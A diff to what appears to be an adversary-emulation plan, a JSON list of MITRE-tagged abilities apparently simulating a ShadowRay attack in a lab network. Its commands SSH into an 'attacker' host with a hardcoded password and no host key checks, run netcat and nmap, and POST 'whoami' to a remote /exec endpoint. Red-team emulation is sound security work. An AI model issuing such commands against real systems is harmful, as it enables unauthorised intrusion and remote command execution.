@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'nc -v'"
+        "command": "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'nmap localhost 2>&1'"
       }
     ]
   },
@@ -100,7 +100,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "ccurl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
       }
     ]
   },
@@ -151,7 +151,7 @@
   },
   {
     "ability_id": "22545851-970c-5709-bdbc-rothshadow",
-    "name": "END OF EMULATION",
+    "name": "END OF SHADOWRAY",
     "tactic": "impact",
     "technique_name": "System Shutdown",
     "technique_id": "T1529",
@@ -160,7 +160,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "echo \"END OF SALESFORCE DATA EXFILTRATION\""
+        "command": "echo \"END OF SHADOWRAY\""
       }
     ]
   }    
